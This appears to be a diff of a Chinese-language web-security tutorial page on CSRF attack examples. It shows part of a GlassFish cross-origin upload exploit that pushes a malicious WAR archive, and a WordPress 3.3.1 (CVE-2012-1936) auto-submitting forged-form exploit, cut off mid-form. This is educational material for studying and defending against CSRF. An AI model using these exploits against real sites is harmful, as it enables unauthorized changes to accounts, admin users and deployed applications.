-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">readBinary</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">tmp</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">&amp;</span>
-</span></span><span class="line"><span class="cl"><span class="mh">0xff</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">tmp</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">start</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">getBinary</span><span class="p">(</span><span class="s1">&#39;maliciousarchive.war&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nx">fileUpload</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="s2">&#34;maliciousarchive.war&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div>
-          </div>
-
-          
-
-
-
-          
-          
-          <div class="article-widget">
-            
-<div class="container-xl row post-nav">
-  
-  
-  
-  <div class="col-6 post-nav-item">
-    <div class="meta-nav">上一页</div>
-    <a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/" rel="next">防御修复</a>
-  </div>
-  
-  
-  
-  <div class="col-6 post-nav-item">
-    <div class="meta-nav">下一页</div>
-    <a href="/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" rel="prev">漏洞检测</a>
-  </div>
-  
-</div>
-
-          </div>
-          
-
-        <div class="body-footer">
-          <p>最近更新于 0001-01-01</p>
-
-          
-
-
-
-          
-
-
-  
-  
-  
-
-  
-
-  
-  <section id="comments" class="mb-3 pt-0">
-    
-<div id="disqus_thread"></div>
-<script>
-  var disqus_config = function () {
-    
-    
-    
-  };
-  (function() {
-    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-      document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-      return;
-    }
-    var d = document, s = d.createElement('script'); 
-    s.async = true;
-    
-    s.src = "https://ngte-website.oss-accelerate.aliyuncs.com/disqus/embed.js";
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-  })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-  </section>
-  
-
-
-
-          
-
-
-        </div>
-
-      </article>
-
-      <footer class="site-footer">
-
-  
-
-
-
-  
-
-  
-  <div class="copyright py-4 bg-footer">
-      <div class="row justify-content-center">
-        <div class="text-center footer-color">
-          <p class="mb-0">© 2017-2022 NGTE all rights reserved</p>
-        </div>
-    </div>
-  </div>
-
-</footer>
-
-
-    </main>
-  </div>
-</div>
-<script src="//unpkg.com/heti/umd/heti-addon.min.js"></script>
-<script>
-  const heti = new Heti('.article');
-  heti.autoSpacing();
-</script>
-<script type="text/javascript">
-  window.$crisp = [];
-  window.CRISP_WEBSITE_ID = "12adcc35-9621-4313-8262-62dc654b29d8";
-  (function () {
-    setTimeout(function() {
-      d = document;
-      s = d.createElement("script");
-      s.src = "https://client.crisp.chat/l.js";
-      s.async = 1;
-      d.getElementsByTagName("head")[0].appendChild(s);
-    }, 2500);
-  })();
-</script>
-  </div>
-
-  <div class="page-footer">
-    
-    
-  </div>
-
-      
-
-    
-    <script src="/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js"></script>
-
-    
-    
-    
-      
-
-      
-      
-
-      
-
-      
-        
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/highlight.min.js" integrity="sha512-Ypjm0o7jOxAd4hpdoppSEN0TQOC19UtPAqD+4s5AlXmUvbmmS/YMxYqAqarQYyxTnB6/rqip9qcxlNB/3U9Wdg==" crossorigin="anonymous"></script>
-        
-        
-      
-
-    
-
-    
-    
-    
-
-    
-    
-    
-      
-      <script id="search-hit-algolia-template" type="text/html">
-        <div class="search-hit">
-          <div class="search-hit-content">
-            <div class="search-hit-name">
-              <a href="{{relpermalink}}">{{#helpers.highlight}}{ "attribute": "title" }{{/helpers.highlight}}</a>
-            </div>
-            <div class="article-metadata search-hit-type">{{type}}</div>
-            <p class="search-hit-description">{{#helpers.highlight}}{ "attribute": "summary" }{{/helpers.highlight}}</p>
-          </div>
-        </div>
-      </script>
-      
-        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js" crossorigin="anonymous"></script>
-      
-      
-    
-
-    
-    
-
-    
-    
-    
-    
-      
-      <script id="dsq-count-scr" src="https://ngte-website.oss-accelerate.aliyuncs.com/disqus/count.js" async></script>
-    
-
-    
-    
-      
-      
-      
-      
-      
-      
-      
-    
-
-    
-    <script src="/zh/js/algolia-search-built.min.4387d694ca1258194aaf562b8cd1c400.js" type="module"></script>
-    
-
-    
-    
-    
-    <script id="page-data" type="application/json">{"use_headroom":false}</script>
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    <script src="/zh/js/wowchemy.min.d1673c7a11d1238516cbe12a1e84257f.js"></script>
-
-    
-    
-    
-    
-    
-    
-    <script>
-
-var mybutton = document.getElementById("backTopBtn");
-
-
-window.onscroll = function() {scrollFunction()};
-
-function scrollFunction() {
-  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
-    mybutton.style.display = "block";
-  } else {
-    mybutton.style.display = "none";
-  }
-}
-
-
-function topFunction() {
-  document.body.scrollTop = 0;
-  document.documentElement.scrollTop = 0;
-}
-</script>
-
-
-    
-
-    
-    
-    <script src="https://cdn.jsdelivr.net/gh/bryanbraun/anchorjs@4.2.2/anchor.min.js" integrity="sha512-I7w3ZdSFzw5j3jU3ZkNikBNeIrl3i+hEuEdwNmqUJvwNcaBUNcijnP2gd9DtGlgVYDplfjGoD8vTNsID+lCjqg==" crossorigin="anonymous"></script>
-    <script>
-      anchors.add();
-    </script>
-    
-
-    
-    <script>
-
-
-
-(function() {
-  'use strict';
-
-  if(!document.queryCommandSupported('copy')) {
-    return;
-  }
-
-  function flashCopyMessage(el, msg) {
-    el.className = "highlight-copy-btn";
-    el.textContent = msg;
-    setTimeout(function() {
-      el.textContent = "";
-      el.className = "highlight-copy-btn fa fa-copy";
-    }, 1000);
-  }
-
-  function selectText(node) {
-    var selection = window.getSelection();
-    var range = document.createRange();
-    range.selectNodeContents(node);
-    selection.removeAllRanges();
-    selection.addRange(range);
-    return selection;
-  }
-
-  function addCopyButton(containerEl) {
-    var copyBtn = document.createElement("button");
-    copyBtn.className = "highlight-copy-btn fa fa-copy";
-    copyBtn.textContent = "";
-
-    var codeEl = containerEl.firstElementChild;
-    copyBtn.addEventListener('click', function() {
-      try {
-        var selection = selectText(codeEl);
-        document.execCommand('copy');
-        selection.removeAllRanges();
-        
-        flashCopyMessage(copyBtn, '已复制')
-        
-      } catch(e) {
-        console && console.log(e);
-        flashCopyMessage(copyBtn, 'Failed :\'(')
-      }
-    });
-
-    containerEl.appendChild(copyBtn);
-  }
-
-  
-  var highlightBlocks = document.getElementsByClassName('highlight');
-  Array.prototype.forEach.call(highlightBlocks, addCopyButton);
-})();
-</script>
-
-    
-
-
-</body>
-</html>
+<!doctype html><html lang=zh><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.5.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><meta name=google-site-verification content="google69a5cccb61297807"><meta name=baidu-site-verification content="cqmZHEleVh"><meta name=description content="Exploits 本部分我们来看几个基于 CSRF 攻击的实例，包括简单的基于表单 POST 请求的攻击，其可以诱导用户点击.submit() 按钮既可以发起攻击。其他的还有稍微复杂一点的跨域文件上传 CSRF 攻击，其主要使用了 CORS use of the xhr.withCredentals beha"><link rel=alternate hreflang=zh href=https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/><meta name=theme-color content="#0a55a7"><link rel=stylesheet href=/css/vendor-bundle.min.c7b8d9abd591ba2253ea42747e3ac3f5.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/github.min.css crossorigin=anonymous title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/dracula.min.css crossorigin=anonymous title=hl-dark media=print onload='this.media="all"' disabled><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/instantsearch.css@7.4.5/themes/satellite-min.css integrity="sha256-TehzF/2QvNKhGQrrNpoOb2Ck4iGZ1J/DI4pkd2oUsBc=" crossorigin=anonymous><link rel=stylesheet href=/css/wowchemy.63df6ae9fc2b4cc71b83f1774d780209.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-40NYXJ8823"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-40NYXJ8823")</script><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?56df1177bce405601b0ecdd7208f75c6",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0f7d075e895d6f5f1f5fdbc1e33dc138_10087_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0f7d075e895d6f5f1f5fdbc1e33dc138_10087_180x180_fill_lanczos_center_3.png><link rel=canonical href=https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@wx-chevalier"><meta property="twitter:creator" content="@wx-chevalier"><meta property="og:site_name" content="Next-gen Tech Edu"><meta property="og:url" content="https://ng-tech.icu/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/"><meta property="og:title" content="攻击实例 | Next-gen Tech Edu"><meta property="og:description" content="Exploits 本部分我们来看几个基于 CSRF 攻击的实例，包括简单的基于表单 POST 请求的攻击，其可以诱导用户点击.submit() 按钮既可以发起攻击。其他的还有稍微复杂一点的跨域文件上传 CSRF 攻击，其主要使用了 CORS use of the xhr.withCredentals beha"><meta property="og:image" content="https://ng-tech.icu/media/sharing.png"><meta property="twitter:image" content="https://ng-tech.icu/media/sharing.png"><meta property="og:locale" content="zh"><title>攻击实例 | Next-gen Tech Edu</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=04763d261209bbc0694e1575dcbf3685><button onclick=topFunction() id=backTopBtn title="Go to top"><i class="fa-solid fa-circle-up" aria-hidden=true></i></button>
+<script src=/js/wowchemy-init.min.14a0ed61c6dbd594b9c75193b25be179.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class="col-6 search-title"><p>搜索</p></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=关闭><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box></div></section><section class=section-search-results><div id=search-hits></div><div id=search-common-queries></div></section></div></aside><div class=page-header><header class=header--fixed><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Next-gen Tech Edu</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label=切换导航>
+<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Next-gen Tech Edu</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/books-gallery><span>笔记（万篇）</span></a></li><li class=nav-item><a class=nav-link href=/#knowledge-map><span>知识图谱</span></a></li><style>.dropdown-item{display:inline-flex}</style><li class="nav-item dropdown"><a href=# class="nav-link dropdown-toggle" data-toggle=dropdown aria-haspopup=true><span>实验室</span><span class=caret></span></a><div class=dropdown-menu><a class=dropdown-item href=/galaxy-home/gh-craft><span>Craft 方块世界</span></a>
+<a class=dropdown-item href=/galaxy-home/glossary-cards><span>3D 知识卡牌</span></a></div></li><style>.dropdown-item{display:inline-flex}</style><li class="nav-item dropdown"><a href=# class="nav-link dropdown-toggle" data-toggle=dropdown aria-haspopup=true><span>其他阅读渠道</span><span class=caret></span></a><div class=dropdown-menu><a class=dropdown-item href=https://zhuanlan.zhihu.com/wxyyxc1992><img style=width:16px;height:16px;display:inline-block;margin-right:8px src=https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230218234451.png></img><span>知乎</span></a>
+<a class=dropdown-item href=https://segmentfault.com/blog/wxyyxc1992><img style=width:16px;height:16px;display:inline-block;margin-right:8px src=https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230219113556.png></img><span>SegmentFault</span></a>
+<a class=dropdown-item href=https://zhuanlan.zhihu.com/wxyyxc1992><img style=width:16px;height:16px;display:inline-block;margin-right:8px src=https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230219113519.png></img><span>掘金</span></a></div></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class=nav-item><a class="nav-link js-search" href=# aria-label=搜索><i class="fas fa-search" aria-hidden=true></i></a></li><li class=nav-item><a class=nav-link href=https://github.com/wx-chevalier aria-label=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a></li><div></div><style>@media only screen and (max-width:600px){.jimmysong-template{display:none!important}}</style><li class=jimmysong-template style=color:#fff;font-size:12px><a href=https://jimmysong.io style=color:#fff>By Jimmy Song's Template</a></li></ul></div></nav></header></div><div class=page-body><link rel=stylesheet href=//unpkg.com/heti/umd/heti.min.css><div class="container-xl docs"><div class="row flex-xl-nowrap"><div class=docs-sidebar><form class="docs-search d-flex align-items-center"><button class="btn docs-toggle d-md-none p-0 mr-md-3 w-100" type=button data-toggle=collapse data-target=#docs-nav aria-controls=docs-nav aria-expanded=false aria-label="Toggle section navigation"><div class=d-flex><span class="d-md-none pl-1 flex-grow-1 text-left overflow-hidden">CSRF</span>
+<span><i class="fas fa-chevron-down"></i></span></div></button>
+<button class="form-control sidebar-search js-search d-none d-md-flex">
+<i class="fas fa-search pr-2"></i>
+<span class=sidebar-search-text>搜索...</span>
+<span class=sidebar-search-shortcut>/</span></button></form><nav class="collapse docs-links" id=docs-nav><ul class="nav docs-sidenav"><li style=display:inline-flex><a style=cursor:pointer onclick=window.history.back()><i class="fas fa-arrow-left pr-1"></i>
+Back</a>
+<span>|</span>
+<a href=/books/><i class="fa-solid fa-house" style=margin-right:4px></i>
+Books</a></li></ul><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-idd7c5ff9a31787a6ec431da0956444724")' href=#idd7c5ff9a31787a6ec431da0956444724 aria-expanded=false aria-controls=idd7c5ff9a31787a6ec431da0956444724 aria-hidden=false data-toggle=collapse><a class="d-inline docs-toc-link" href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/>Web 安全</a>
+<a class="nav-toogle d-inline level" aria-hidden=false data-toggle=collapse href=#idd7c5ff9a31787a6ec431da0956444724 aria-expanded=false aria-controls=idd7c5ff9a31787a6ec431da0956444724><i class="fa-solid fa-angle-down" id=caret-idd7c5ff9a31787a6ec431da0956444724></i></a></div><ul class="nav docs-sidenav collapse show" id=idd7c5ff9a31787a6ec431da0956444724><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-id102de254e3b66d69676966617443d6d8")' href=#id102de254e3b66d69676966617443d6d8 aria-expanded=false aria-controls=id102de254e3b66d69676966617443d6d8 aria-hidden=false data-toggle=collapse><a class="d-inline docs-toc-link" href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/>CSRF</a>
+<a class="nav-toogle d-inline level" aria-hidden=false data-toggle=collapse href=#id102de254e3b66d69676966617443d6d8 aria-expanded=false aria-controls=id102de254e3b66d69676966617443d6d8><i class="fa-solid fa-angle-down" id=caret-id102de254e3b66d69676966617443d6d8></i></a></div><ul class="nav docs-sidenav collapse show" id=id102de254e3b66d69676966617443d6d8><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/>防御修复</a></li><li class="child level active"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B/>攻击实例</a></li><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/csrf/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/>漏洞检测</a></li></ul></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-id11c46297e5b5fcb43e57a5b7873b4743")' href=#id11c46297e5b5fcb43e57a5b7873b4743 aria-expanded=false aria-controls=id11c46297e5b5fcb43e57a5b7873b4743 aria-hidden=false data-toggle=collapse><a class="d-inline docs-toc-link" href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/sql-%E6%B3%A8%E5%85%A5/>SQL 注入</a>
+<a class="nav-toogle d-inline level" aria-hidden=false data-toggle=collapse href=#id11c46297e5b5fcb43e57a5b7873b4743 aria-expanded=false aria-controls=id11c46297e5b5fcb43e57a5b7873b4743><i class="fa-solid fa-angle-right" id=caret-id11c46297e5b5fcb43e57a5b7873b4743></i></a></div><ul class="nav docs-sidenav collapse" id=id11c46297e5b5fcb43e57a5b7873b4743><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/sql-%E6%B3%A8%E5%85%A5/sql-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/>SQL 注入工具</a></li></ul></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-idbd394d3c524abe70dba7d26ea927ed8e")' href=#idbd394d3c524abe70dba7d26ea927ed8e aria-expanded=false aria-controls=idbd394d3c524abe70dba7d26ea927ed8e aria-hidden=false data-toggle=collapse><a class="d-inline docs-toc-link" href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/>XSS</a>
+<a class="nav-toogle d-inline level" aria-hidden=false data-toggle=collapse href=#idbd394d3c524abe70dba7d26ea927ed8e aria-expanded=false aria-controls=idbd394d3c524abe70dba7d26ea927ed8e><i class="fa-solid fa-angle-right" id=caret-idbd394d3c524abe70dba7d26ea927ed8e></i></a></div><ul class="nav docs-sidenav collapse" id=idbd394d3c524abe70dba7d26ea927ed8e><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/%E9%98%B2%E5%BE%A1%E4%BF%AE%E5%A4%8D/>防御修复</a></li><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/xss/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/>漏洞检测</a></li></ul></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-id99f6411072a00e529c0646bc79e3ca24")' href=#id99f6411072a00e529c0646bc79e3ca24 aria-expanded=false aria-controls=id99f6411072a00e529c0646bc79e3ca24 aria-hidden=false data-toggle=collapse><a class="d-inline docs-toc-link" href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/>编码校验</a>
+<a class="nav-toogle d-inline level" aria-hidden=false data-toggle=collapse href=#id99f6411072a00e529c0646bc79e3ca24 aria-expanded=false aria-controls=id99f6411072a00e529c0646bc79e3ca24><i class="fa-solid fa-angle-right" id=caret-id99f6411072a00e529c0646bc79e3ca24></i></a></div><ul class="nav docs-sidenav collapse" id=id99f6411072a00e529c0646bc79e3ca24><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/>代码混淆</a></li><li class="child level"><a href=/books/infosecurity-series/web-%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81%E6%A0%A1%E9%AA%8C/%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%85%85/>自动填充</a></li></ul></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-idafa0d417f45896e8046977ed09c88263")' href=#idafa0d417f45896e8046977ed09c88263 aria-expanded=false aria-controls=idafa0d417f45896e8046977ed09c88263 aria-hidden=false data-toggle=collapse></div></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-id9f1f5b6620f7369f8f6f86bd95b92d6f")' href=#id9f1f5b6620f7369f8f6f86bd95b92d6f aria-expanded=false aria-controls=id9f1f5b6620f7369f8f6f86bd95b92d6f aria-hidden=false data-toggle=collapse></div></div><div class="docs-toc-item has-child"><div class="parent-node d-flex justify-content-between" onclick='Collapse("caret-id789c09d4fce111b0d69c2eb4ff3e7ab9")' href=#id789c09d4fce111b0d69c2eb4ff3e7ab9 aria-expanded=false aria-controls=id789c09d4fce111b0d69c2eb4ff3e7ab9 aria-hidden=false data-toggle=collapse></div></div></ul></div></nav></div><div class="d-none d-xl-block col-xl-2 docs-toc"><ul class="nav toc-top"><li><a href=# id=back_to_top class=docs-toc-title>目录</a></li></ul><nav id=TableOfContents><ul><li><a href=#wordpress-331-multiple-csrf-vulnerabilitieshttpswwwexploit-dbcomexploits18791><a href=https://www.exploit-db.com/exploits/18791/>Wordpress 3.3.1 Multiple CSRF Vulnerabilities</a></a></li><li><a href=#oracle-glassfish-server---rest-cross-site-request-forgery>Oracle GlassFish Server - REST Cross-Site Request Forgery</a></li></ul></nav><div class="subscribe-module col-24 mt-1"><img src=https://ngte-superbed.oss-cn-beijing.aliyuncs.com/item/20230220172727.png alt=image title=王下邀月熊的微信公众号></div></div><main class="py-md-3 pl-md-3 docs-content col-xl-8" role=main><article class=article><h1>攻击实例</h1><div class=article-style><h1 id=exploits>Exploits</h1><p>本部分我们来看几个基于 CSRF 攻击的实例，包括<a href=http://www.exploit-db.com/exploits/18791/ target=_blank rel=noopener>简单的基于表单 POST 请求的攻击</a>，其可以诱导用户点击<code>.submit()</code> 按钮既可以发起攻击。其他的还有稍微复杂一点的<a href=http://www.exploit-db.com/exploits/18766/ target=_blank rel=noopener>跨域文件上传 CSRF 攻击</a>，其主要使用了 <a href=http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html target=_blank rel=noopener>CORS use of the xhr.withCredentals behavior</a>。</p><h2 id=wordpress-331-multiple-csrf-vulnerabilitieshttpswwwexploit-dbcomexploits18791><a href=https://www.exploit-db.com/exploits/18791/ target=_blank rel=noopener>Wordpress 3.3.1 Multiple CSRF Vulnerabilities</a></h2><p>该漏洞是由<a href=http://www.ivanobinetti.com target=_blank rel=noopener>Ivano Binetti</a>在 2012 年 3 月 19 号发现的，影响了<a href=http://wordpress.org/wordpress-3.3.1.zip target=_blank rel=noopener>WordPress 3.3.1 版本 </a>，CVE 编号 CVE-2012-1936。WordPress 是众所周知的博客平台，该漏洞可以允许攻击者修改某个 Post 的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下</p><ul><li>Add Admin/User</li><li>Delete Admin/User</li><li>Approve comment</li><li>Unapprove comment</li><li>Delete comment</li><li>Change background image</li><li>Insert custom header image</li><li>Change site title</li><li>Change administrator&rsquo;s email</li><li>Change Wordpress Address</li><li>Change Site Address</li></ul><p>那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，核心的 Exploit 代码为</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>body</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;javascript:document.forms[0].submit()&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>CSRF Exploit to change post title<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>form</span>
+</span></span><span class=line><span class=cl>      <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=na>name</span><span class=o>=</span><span class=s>&#34;form0&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://&lt;wordpress_ip&gt;:80/wp-admin/admin-ajax.php&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_title&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;hackedtitle&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;post_name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;hackedtitle&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;mm&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;03&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;jj&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;16&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;aa&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;2012&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;hh&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;mn&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
